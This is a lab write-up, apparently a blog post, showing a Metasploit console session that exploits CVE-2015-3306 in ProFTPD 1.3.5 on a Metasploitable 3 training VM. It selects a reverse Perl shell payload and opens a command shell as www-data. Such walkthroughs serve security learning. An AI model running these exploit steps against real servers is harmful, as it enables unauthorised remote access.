---
title: Port 21 / ProFTPD 1.3.5
date: 2023-09-18
description: Port 21 / ProFTPD 1.3.5
tags: 
    - Metasploitable3 Linux Edition
    - metasploit
    - nmap
categories:
    - Parrot OS
    - Metasploitable3 Linux Edition
toc: false
---

## Target: Metasploitable 3 Linux

## Tool: Metasploit

## Vulnerability: ProFTPD 1.3.5 proftpd_modcopy_exec

Port 21 / ProFTPD 1.3.5

[CVE-2015-3306](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306): The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.

https:// <www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/>

```shell
[msf](Jobs:0 Agents:0) >> use exploit/unix/ftp/proftpd_modcopy_exec
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   ProFTPD 1.3.5


[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> set TARGET 0
TARGET => 0
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> set RHOST 10.0.2.28
RHOST => 10.0.2.28
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> set LHOST 10.0.2.16
LHOST => 10.0.2.16
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> set SITEPATH /var/www/html
SITEPATH => /var/www/html
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> show payloads

Compatible Payloads
===================

   #   Name                                 Disclosure Date  Rank    Check  Description
   -   ----                                 ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                              normal  No     Add user with useradd
   1   payload/cmd/unix/bind_awk                             normal  No     Unix Command Shell, Bind TCP (via AWK)
   2   payload/cmd/unix/bind_netcat                          normal  No     Unix Command Shell, Bind TCP (via netcat)
   3   payload/cmd/unix/bind_perl                            normal  No     Unix Command Shell, Bind TCP (via Perl)
   4   payload/cmd/unix/bind_perl_ipv6                       normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   5   payload/cmd/unix/generic                              normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/pingback_bind                        normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
   7   payload/cmd/unix/pingback_reverse                     normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
   8   payload/cmd/unix/reverse_awk                          normal  No     Unix Command Shell, Reverse TCP (via AWK)
   9   payload/cmd/unix/reverse_netcat                       normal  No     Unix Command Shell, Reverse TCP (via netcat)
   10  payload/cmd/unix/reverse_perl                         normal  No     Unix Command Shell, Reverse TCP (via Perl)
   11  payload/cmd/unix/reverse_perl_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   12  payload/cmd/unix/reverse_python                       normal  No     Unix Command Shell, Reverse TCP (via Python)
   13  payload/cmd/unix/reverse_python_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via python)

[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> set payload payload/cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) >> exploit

[*] Started reverse TCP handler on 10.0.2.16:4444 
[*] 10.0.2.28:80 - 10.0.2.28:21 - Connected to FTP server
[*] 10.0.2.28:80 - 10.0.2.28:21 - Sending copy commands to FTP server
[*] 10.0.2.28:80 - Executing PHP payload /4MUaAhC.php
[+] 10.0.2.28:80 - Deleted /var/www/html/4MUaAhC.php
[*] Command shell session 1 opened (10.0.2.16:4444 -> 10.0.2.28:44879) at 2024-02-20 12:08:32 +0000

uname -a
Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
whoami
www-data
pwd
/var/www/html
```
